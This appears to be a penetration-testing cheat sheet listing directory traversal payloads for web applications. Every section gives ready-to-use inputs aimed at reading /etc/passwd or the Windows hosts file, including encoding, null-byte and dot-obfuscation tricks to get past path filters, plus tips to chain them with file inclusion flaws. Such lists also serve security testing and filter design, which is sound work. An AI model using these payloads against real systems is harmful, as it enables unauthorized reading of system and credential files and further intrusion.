Payloads

Basic traversal

../../../../etc/passwd

Deep traversal (bypass depth)

../../../../../../../../etc/passwd

Windows traversal

..\..\..\..\Windows\System32\drivers\etc\hosts

Null byte (legacy systems)

../../../../etc/passwd%00
Bypass Techniques

URL encoding

../ → %2e%2e%2f
%2e%2e%2f%2e%2e%2fetc/passwd

Double encoding

%252e%252e%252f

Using backslashes (Windows)

..\..\..\..\Windows\System32\drivers\etc\hosts

Mixed encoding

%2e%2e/\%2e%2e/\etc/passwd

Dot obfuscation bypass

....//....//....//etc/passwd
....\/....\/....\/etc/passwd

Mixed traversal patterns

..../..../..../..../etc/passwd
../.././../.././etc/passwd

Redundant slashes

../../../../etc//passwd
../../../../etc/./passwd

Notes
  • Directory traversal depends on how many ../ are required.
  • Try both URL encoding and plain traversal.
  • Check if the application filters patterns like ../.
  • Combine with other vulnerabilities (LFI, file inclusion).
  • Always test manually and with tools like curl or Burp.
